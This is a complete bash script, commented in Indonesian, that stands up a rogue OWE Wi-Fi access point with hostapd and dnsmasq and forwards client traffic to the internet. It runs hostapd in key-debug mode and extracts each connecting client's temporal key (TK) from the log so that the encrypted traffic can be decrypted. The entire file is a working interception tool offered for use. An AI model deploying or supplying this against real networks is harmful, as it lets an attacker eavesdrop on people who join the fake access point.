#!/bin/bash
#
# Decrypt trafik Wi-Fi OWE (Opportunistic Wireless Encryption) menggunakan kunci TK
# Dibuat oleh: Rofi (Fixploit03)

set -e

# cek jumlah argumen
if [[ "${#}" -ne 3 ]]; then
	echo "Usage: sudo ${0} <interface_ap> <interface_internet> <ssid>"
	exit 1
fi

# cek root
if [[ "${EUID}" -ne 0 ]]; then
	echo "ERROR: Script ini harus dijalankan sebagai root!"
	exit 1
fi

# konfigurasi
banner="rogue owe"
interface_ap="${1}"
interface_internet="${2}"
ssid="${3}"
ip_address="10.10.10.1/24"
conf_dhcp="dnsmasq.conf"
conf_ap="hostapd.conf"
log="log.txt"

# validasi ssid
if [[ "${#ssid}" -gt 32 ]]; then
	echo "ERROR: Panjang SSID tidak valid!"
	exit 1
fi

# buat udahan teken (CTRL+C)
udahan(){
	# kill service
	killall -9 hostapd dnsmasq

	# flush ip address
	ip a f dev "${interface_ap}"
	ip l set "${interface_ap}" down
	iw dev "${interface_ap}" set type managed
	ip link set "${interface_ap}" up

	# flush rules ip_tables
	iptables -F
	iptables -t nat -F

	# disable ip forwarding
	echo 0 > /proc/sys/net/ipv4/ip_forward

	# hapus file config
	rm "${conf_ap}" "${conf_dhcp}" "${log}"
}

trap udahan SIGINT

# nampilin banner
figlet -f slant "${banner}"
echo ""

# set ip address
echo "[*] Nyeting IP Address buat interface '${interface_ap}'..."
ip a f dev "${interface_ap}"
ip a a "${ip_address}" dev "${interface_ap}"
ip l set "${interface_ap}" up

# bikin config dnsmasq
echo "[*] Bikin config dnsmasq..."
cat <<EOF> "${conf_dhcp}"
interface=${interface_ap}
bind-interfaces
dhcp-authoritative
dhcp-range=10.10.10.2,10.10.10.254,255.255.255.0,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,8.8.8.8,8.8.4.4
port=0
EOF

# bikin config hostapd
echo "[*] Bikin config hostapd..."
cat <<EOF> "${conf_ap}"
interface=${interface_ap}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=11
wpa=2
wpa_key_mgmt=OWE
rsn_pairwise=CCMP
ieee80211w=2
EOF

# ngaktifin ip forwarding
echo "[*] Ngaktifin IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# ngaktifin internet sharing
echo "[*] Ngaktifin internet sharing (NAT)..."
iptables -t nat -A POSTROUTING -o "${interface_internet}" -j MASQUERADE
iptables -A FORWARD -i "${interface_ap}" -o "${interface_internet}" -j ACCEPT
iptables -A FORWARD -i "${interface_internet}" -o "${interface_ap}" -m state --state RELATED,ESTABLISHED -j ACCEPT

# ngejalanin service
echo "[*] Ngejalanin DHCP Server..."
dnsmasq -C "${conf_dhcp}"
echo "[*] Ngejalanin AP..."
hostapd "${conf_ap}" -d -K > "${log}" 2>&1 &

# nunggu client
echo "[*] Nunggu client konek ..."
tail -F "${log}" | grep -a -w --line-buffered "TK - hexdump(len=16)" | while read -r baris; do
	tk=$(echo "${baris}" | cut -d ' ' -f5- | tr -d ' ')
	echo "[+] TK = ${tk}"
done
